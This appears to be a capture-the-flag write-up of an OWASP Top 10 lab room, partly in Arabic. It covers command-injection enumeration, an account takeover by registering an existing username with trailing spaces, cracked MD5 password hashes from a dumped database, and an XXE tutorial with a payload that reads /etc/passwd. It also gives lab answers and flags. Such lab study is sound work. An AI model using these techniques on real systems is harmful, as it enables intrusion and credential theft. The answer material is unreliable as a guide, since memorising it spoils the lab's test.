# OWASP Top 10

<details>
  <summary>[Severity 1] Command Injection Practical</summary>

> What strange text file is in the website root directory?

```
$ ls
```

```
css
drpepper.txt
evilshell.php
index.php
js 
```

> How many non-root/non-service/non-daemon users are there?  how to know that in linux

```
getent passwd | awk -F: '$3 >= 1000 && $7 != "/usr/sbin/nologin" && $7 != "/bin/false" && $1 != "nobody" {print $1}' | wc -l
```

```
0
```

> What user is this app running as?

```
$ whoami
```

```
www-data 
```

> What is the user's shell set as?

```
getent passwd www-data | cut -d: -f7
```

> What version of Ubuntu is running?

```
$ cat /etc/os-release
```

```
18.04.4 
```

> Print out the MOTD.  What favorite beverage is shown?

```
$ cat drpepper.txt
```

```
I love Dr Pepper 
```

</details>


<details>
   <summary>[Severity 2] Broken Authentication Practical</summary>


> What is the flag that you found in darren's account?

- if you try to rigister using ``darren``
  - user already exist
- now register using ``darren   `` and login you will found the flag

> do same to ``auther``





  
</details>



<details>
  <summary>[Severity 3] Sensitive Data Exposure (Challenge)</summary>

![image](https://github.com/user-attachments/assets/3998c50c-5e62-4c36-9e2d-d57e48981a08)


![image](https://github.com/user-attachments/assets/c32a4e6e-078b-4396-a759-683fd515eff1)


![image](https://github.com/user-attachments/assets/8f486f43-09ad-414f-b40a-2c12b57fd2de)

```
��������tablesessionssessionsCREATE TABLE sessions(
sessionID TEXT NOT NULL UNIQUE,
userID TEXT NOT NULL,
expiry INT NOT NULL,
PRIMARY KEY (sessionID))/Cindexsqlite_autoindex_sessions_1sessions�*�'�-tableusersusersCREATE TABLE users(
userID TEXT NOT NULL UNIQUE,
username TEXT NOT NULL UNIQUE,
password TEXT NOT NULL,
admin INT NOT NULL,
�h��GKHMMEY(user23023b67a32488588db1e28579ced7ecBobad0234829205b9033196ba818f7a872bJM4e8423b514eef575394ff78caed3254dAlice268b38ca7b84f44fa0a6cdc86e6301e0JMM   4413096d9c933359b898b6202288a650admin6eea9b7ef19179a06954edd0f6c05ceb
����mH%%$M23023b67a32488588db1e28579ced7ec$M4e8423b514eef575394ff78caed3254d#M  4413096d9c933359b898b6202288a650
�J����  Bob     Alice   admin
�$                              
```
> admin password hash is

```
6eea9b7ef19179a06954edd0f6c05ceb
```

> crack it on crackstation

```
qwertyuiop
```

```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```


</details>



<details>
    <summary>[Severity 4 XML External Entity - eXtensible Markup Language</summary>

## 📏 القواعد المهمة في كتابة XML (Syntax Rules)

| القاعدة                                          | الشرح                                                |
| ------------------------------------------------ | ---------------------------------------------------- |
| 🔸 كل XML لازم يكون عنده عنصر جذر (Root Element) | مثل `<data>...</data>`                               |
| 🔸 XML حساس لحالة الأحرف                         | `<To>` ≠ `<to>`                                      |
| 🔸 لازم تغلق كل العناصر                          | `<tag></tag>` أو باستخدام self-closing مثل `<tag />` |
| 🔸 القيم النصية يجب أن تُحاط بعلامات اقتباس      | `<tag attr="value">`                                 |
| 🔸 لا يوجد عناصر غير مغلقة مثل HTML              | (ما في `<br>` بس في `<br/>`)                         |




## 📋 مثال شامل:

```
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book category="programming">
    <title lang="en">Learn XXE</title>
    <author>Cyber Falcon</author>
    <year>2025</year>
    <price>0.00</price>
  </book>
</bookstore>
```

---

📎 DTD (Document Type Definition)
هنا يبدأ الموضوع يكون خطير، لأننا راح نستخدم DTD في استغلال XXE لاحقًا.

إيش هو DTD؟
هو تعريف هيكل وهيئة المستند XML، ويقدر يحتوي على:

تعريف العناصر

السماح بالكيانات الخارجية (External Entities)

مثال DTD داخلي:


```
<!DOCTYPE mail [
  <!ELEMENT mail (to, from, subject, text)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT subject (#PCDATA)>
  <!ELEMENT text (#PCDATA)>
]>
```


☠️ لكن هنا الخطورة:
DTD يسمح بتعريف كيان خارجي External Entity زي كذا:



```
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

----

![image](https://github.com/user-attachments/assets/ef843c7a-364d-49dd-b57b-241504ee501b)


--- ---
---
---

🧱 مثال توضيحي:
ملف DTD داخلي:

```
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

XML يستند عليه:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

🧠 شرح مفصل لكل سطر في DTD:

| السطر                                    | المعنى                                                                               |
| ---------------------------------------- | ------------------------------------------------------------------------------------ |
| `<!DOCTYPE note [...]>`                  | يعرّف أن الجذر (Root Element) اسمه `note`                                            |
| `<!ELEMENT note (to,from,heading,body)>` | عنصر `note` لازم يحتوي بالترتيب على العناصر الأربعة: `to`, `from`, `heading`, `body` |
| `<!ELEMENT to (#PCDATA)>`                | العنصر `to` يحتوي بيانات نصية قابلة للقراءة (Character Data)                         |
| `#PCDATA`                                | اختصار لـ: **Parsed Character Data** → يعني نص يتم تفسيره                            |
| باقي العناصر (`from`, `heading`, `body`) | كلهم زي `to`، يحتوي بيانات نصية فقط                                                  |



🔎 أنواع البيانات في DTD:

| النوع      | الشرح                        |                                    |
| ---------- | ---------------------------- | ---------------------------------- |
| `#PCDATA`  | بيانات نصية قابلة للتحليل    |                                    |
| `EMPTY`    | العنصر لا يحتوي على أي محتوى |                                    |
| `ANY`      | العنصر ممكن يحتوي على أي شيء |                                    |
| \`(#PCDATA | element)\*\`                 | محتوى مختلط، ممكن يكون نص أو عناصر |



📦 أنواع DTD:


| النوع            | الوصف                                                |
| ---------------- | ---------------------------------------------------- |
| **Internal DTD** | يُكتب داخل ملف XML نفسه                              |
| **External DTD** | يُخزّن في ملف خارجي (`note.dtd`) ويتم ربطه بـ SYSTEM |



مثال ربط DTD خارجي:


```
<!DOCTYPE note SYSTEM "note.dtd">
```

🎯 ليش نستخدم DTD؟

- نتأكد أن ملف XML صحيح وصالح

- يسهل التعامل بين الأنظمة المختلفة

- أساس مهم في التحقق من الصيغة قبل استخدام XML في البرمجة أو المعالجة






## 🚨 ملاحظة أمان:
> لأن DTD يسمح بكيانات خارجية (<!ENTITY ... SYSTEM ...>)، نقدر نستغلها في هجمات XXE، وهذا بالضبط الي راح ندخله بعد ما نخلص الأساسيات.





![image](https://github.com/user-attachments/assets/c103f572-64be-44ed-8cde-fd16dffc6237)

---
---
---



🧪 أولًا: Payload بسيط (تعريف كيان داخلي)
💻 الكود:

```
<!DOCTYPE replace [
  <!ENTITY name "feast">
]>
<userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
</userInfo>
```

🔍 الشرح:
<!ENTITY name "feast"> ← بنعرّف كيان اسمه name وقيمته "feast".

&name; ← بنستخدم الكيان داخل العنصر <lastName>.

📌 النتيجة بعد تفسير XML:

```
<userInfo>
  <firstName>falcon</firstName>
  <lastName>feast</lastName>
</userInfo>
```

✅ ده مثال تعليمي على إزاي XML ممكن يستخدم كيانات (Entities)، لكن ما فيهوش اختراق.



---


💣 ثانيًا: Payload حقيقي لاستغلال XXE لقراءة ملفات
💻 الكود:

```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY read SYSTEM "file:///etc/passwd">
]>
<root>&read;</root>
```

🔍 الشرح:
<!ENTITY read SYSTEM "file:///etc/passwd"> ← هنا بنعرّف كيان خارجي (External Entity) بياخد قيمة محتوى ملف من السيرفر.

&read; ← بيتم استدعاء الكيان داخل العنصر <root>.

📌 لو التطبيق فيه ثغرة XXE ومش عامل الحماية اللازمة:

الكود ده هيخلي التطبيق يفتح ملف /etc/passwd من نظام التشغيل ويعرضه لك!

``📂 /etc/passwd``:

هو ملف في نظام لينوكس يحتوي على معلومات المستخدمين، وغالبًا ما يُستخدم لاختبار وجود الثغرة.



⚠️ ملاحظات مهمة:

1- ✅ لازم التطبيق يسمح بقراءة DTD أو ما يكون فيه الحماية (زي منع الكيانات الخارجية).

2- ❌ لو التطبيق عامل hardening (زي في Java أو PHP الحديثة)، ممكن البايلود ما يشتغل.

3- 🔒 بعض الملفات ممكن تكون مقفولة أو require root access، فقراءتها هتفشل.



🎯 خلاصة:


| النوع               | الشرح                               | مثال                                         |
| ------------------- | ----------------------------------- | -------------------------------------------- |
| **Internal Entity** | كيان داخلي بقيمة ثابتة              | `<!ENTITY name "feast">`                     |
| **External Entity** | كيان بيروح يقرأ من ملف أو URL خارجي | `<!ENTITY read SYSTEM "file:///etc/passwd">` |





![image](https://github.com/user-attachments/assets/2a9efdc7-aa39-447e-9033-a32ff99570e3)



![image](https://github.com/user-attachments/assets/ec86f674-36f1-4b6b-83a8-ae0ce0b50105)

![image](https://github.com/user-attachments/assets/5cff94f1-2320-4729-8c58-96f05ba90a33)






   
</details>







<details>
  <summary>[Severity 5] Broken Access Control</summary>


![image](https://github.com/user-attachments/assets/43c12a69-d4e0-474c-96d8-da456d3ee971)





</details>



<details>
  <summary>[Severity 6] Security Misconfiguration</summary>


![image](https://github.com/user-attachments/assets/887466f1-854d-4700-b280-6adcc500f8aa)

![image](https://github.com/user-attachments/assets/7fb4eaac-2932-4fad-8f0d-eb4f871f48f5)


![image](https://github.com/user-attachments/assets/68a62ce1-fd7c-4ae7-bc98-250cb8f8dbe7)


</details>














